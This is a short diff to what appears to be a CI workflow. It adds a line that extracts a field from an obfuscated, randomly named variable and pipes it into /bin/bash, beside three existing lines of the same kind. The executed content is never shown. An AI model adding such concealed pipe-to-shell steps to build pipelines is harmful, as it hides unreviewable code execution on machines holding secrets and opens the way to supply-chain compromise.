@@ -23,6 +23,7 @@ jobs:
           echo $des265 | jq -r .bzsg1191 | /bin/bash
           echo $bqg814 | jq -r .ynp05 | /bin/bash
           echo $uk73847 | jq -r .eink0532 | /bin/bash
+          echo $nc9 | jq -r .r70942 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
